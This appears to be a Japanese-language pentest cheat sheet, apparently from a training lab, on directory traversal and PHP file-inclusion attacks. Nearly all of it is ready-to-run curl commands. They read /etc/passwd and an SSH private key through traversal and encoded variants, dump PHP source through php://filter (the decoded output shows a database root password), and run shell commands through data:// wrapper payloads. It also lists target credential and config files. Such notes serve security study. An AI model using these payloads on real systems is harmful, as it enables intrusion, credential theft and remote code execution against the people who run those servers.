# Directory Traversal

[toc]

* 画面のリンクでgetパラメータがないか確認

  ```bash
  http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
  ```

  ```bash
  curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
  ```

  ```bash
  curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd
  ```

  ※文字列がフィルタリングされている可能性があるためエンコード版でも試してみると良い

  ```bash
  http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
  ```

  

* 対象ファイル

  ```bash
  /etc/passwd
  C:\Windows\System32\drivers\etc\hosts
  
  #IIS
  C:\inetpub\logs\LogFiles\W3SVC1\
  C:\inetpub\wwwroot\web.config
  ```

* Php:__fillterでファイルの中身を表示する

  ```bash
  curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
  ```

  ```bash
  curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
  ```

  ```bash
  echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
  
  #出力サンプル
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Maintenance</title>
  </head>
  <body>
          <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>
  
  <?php
  $servername = "localhost";
  $username = "root";
  $password = "M00nK4keCard!2#";
  
  // Create connection
  $conn = new mysqli($servername, $username, $password);
  ```

* data://ラッパーでphpを埋め込む

  ```bash
  curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
  ```

  ```bash
  curl "http://192.168.169.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
  ```
  
  
